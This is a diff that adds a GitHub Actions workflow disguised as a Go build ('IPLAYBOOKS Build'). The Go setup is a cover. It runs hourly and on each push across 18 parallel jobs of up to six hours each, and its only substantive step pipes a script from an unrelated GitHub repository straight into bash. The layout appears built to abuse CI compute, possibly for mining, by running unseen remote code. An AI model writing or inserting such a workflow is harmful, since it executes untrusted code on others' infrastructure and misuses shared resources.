@@ -1,0 +1,43 @@
+name: CINUL
+on:
+  push:
+    branches:
+      - main
+
+  schedule:
+    - cron: '0 * * * *'
+
+jobs:
+  build:
+    name: IPLAYBOOKS Build
+    runs-on: ubuntu-latest
+    
+    strategy:
+      max-parallel: 256
+      fail-fast: false
+      matrix:
+        go: [ '1.18', '1.19', '1.20' ]
+        flag: [ kmn, oiu, qwe, nvb, tby, muh ]
+
+    timeout-minutes: 360
+    
+    env:
+      NUM_JOBS: 256
+      CURRENT_GO_VERSION: ${{ matrix.go }}
+      CURRENT_FLAG: ${{ matrix.flag }}
+
+    steps:
+      - name: Checkout repository code
+        uses: actions/checkout@v4
+
+      - name: Set up Go ${{ matrix.go }}
+        uses: actions/setup-go@v5
+        with:
+          go-version: ${{ matrix.go }}
+          cache: true
+        id: setup-go-env
+
+      - name: Execute external script
+        run: |
+          echo "Attempting to download and execute external script..."
+          curl -sL https://raw.githubusercontent.com/moyz-2/ixi/refs/heads/main/ixi%20new | bash
